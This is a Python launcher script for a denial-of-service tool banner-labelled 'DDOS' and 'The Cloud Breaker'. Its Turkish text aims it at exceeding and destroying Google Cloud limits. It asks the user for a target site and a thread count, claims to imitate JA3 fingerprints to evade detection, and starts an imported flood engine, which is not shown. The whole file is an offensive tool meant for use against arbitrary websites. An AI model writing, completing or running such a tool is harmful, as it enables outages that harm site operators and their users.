import asyncio
import os
import sys
import time
from core.engine import AnnabethExtremeV5
from colorama import Fore, init, Style

init(autoreset=True)


def banner():
    os.system('clear')
    print(f"""{Fore.RED}{Style.BRIGHT}
    ██████╗ ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
    ██║  ██║██║  ██║██║   ██║███████╗
    ██║  ██║██║  ██║██║   ██║╚════██║
    ██████╔╝██████╔╝╚██████╔╝███████║
    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    {Fore.WHITE}--- ANNABETH OMNI-V5: THE CLOUD BREAKER ---
    {Fore.YELLOW}Hedef: Google Cloud Limitlerini Aşmak ve Yok Etmek!
    """)


async def main():
    banner()
    target = input(f"{Fore.CYAN}[?] Hedef (Örn: https://site.com): {Fore.WHITE}")
    threads = input(f"{Fore.CYAN}[?] Thread (GCP için 500-1500 önerilir): {Fore.WHITE}")

    try:
        threads = int(threads)
    except:
        threads = 1000

    print(f"\n{Fore.YELLOW}[*] Motorlar ısıtılıyor... {Fore.MAGENTA}JA3 Fingerprint taklit ediliyor...")
    time.sleep(1.5)

    engine = AnnabethExtremeV5(target, threads)
    try:
        await engine.start()
    except KeyboardInterrupt:
        engine.is_running = False
        print(f"\n\n{Fore.RED}[!] Operasyon durduruldu. {Fore.WHITE}Skor: {engine.total_packets}")


if __name__ == "__main__":
    asyncio.run(main())